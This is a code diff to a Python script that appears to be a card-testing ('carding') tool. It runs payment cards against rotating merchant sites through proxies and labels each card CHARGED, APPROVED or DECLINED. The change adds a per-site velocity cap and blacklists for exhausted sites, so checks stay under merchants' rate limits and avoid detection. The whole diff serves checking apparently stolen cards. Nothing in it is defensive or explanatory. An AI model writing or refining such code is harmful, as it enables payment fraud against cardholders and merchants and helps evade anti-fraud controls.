@@ -104,7 +104,34 @@ def extract_cards(text):
     return cards
 
 
-_bad_sites = set()  # sites that returned "Amount too small" (min > ₹100)
+_bad_sites = set()   # sites that returned "Amount too small" (min > ₹100)
+_dead_sites = set()  # sites that returned "server error — site issue" (exhausted)
+
+# A: per-site velocity cap — sites exhaust at ~10 checks ("server error"), so
+# cap each site at 3 checks per 5-min window and rotate. Tighter than the IP cap.
+MAX_CHECKS_PER_SITE = 3
+SITE_PAUSE_SECONDS = 300  # 5 min
+_site_uses = {}
+_site_paused_until = {}
+_site_guard = threading.Lock()
+
+
+def _record_site_use(site):
+    with _site_guard:
+        key = _site_key(site)
+        uses = _site_uses.get(key, 0) + 1
+        _site_uses[key] = uses
+        if uses >= MAX_CHECKS_PER_SITE:
+            _site_paused_until[key] = time.time() + SITE_PAUSE_SECONDS
+            _site_uses[key] = 0
+
+
+def _site_available(site):
+    key = _site_key(site)
+    with _site_guard:
+        if key in _bad_sites or key in _dead_sites:
+            return False
+        return time.time() >= _site_paused_until.get(key, 0)
 
 
 def _next_site():
@@ -116,9 +143,8 @@ def _next_site():
     n = len(_sites)
     for _ in range(n):
         site = _sites[next(_site_ctr) % n]
-        if _site_key(site) in _bad_sites:
-            continue
-        return site
+        if _site_available(site):
+            return site
     return None
 
 
@@ -207,9 +233,12 @@ def check_fn(card):
             return "ERROR", f"API: {str(e)[:80]}", "UNKNOWN"
         status = str(data.get("status") or "error").lower()
         msg = data.get("message") or data.get("reason") or "N/A"
-        if "amount too small" in (msg or "").lower():
-            _bad_sites.add(_site_key(site))
         m = (msg or "").lower()
+        if "amount too small" in m:
+            _bad_sites.add(_site_key(site))
+        if "server error" in m or "site issue" in m:
+            _dead_sites.add(_site_key(site))
+        
         if status == "charged":
             return "CHARGED", msg, "CHARGED"
         if status == "approved":
@@ -220,6 +249,7 @@ def check_fn(card):
             return "DECLINED", msg, "UNKNOWN"
         return "ERROR", msg, "UNKNOWN"
     finally:
+        _record_site_use(site)
         _record_proxy_use(proxy)
         lock.release()
 
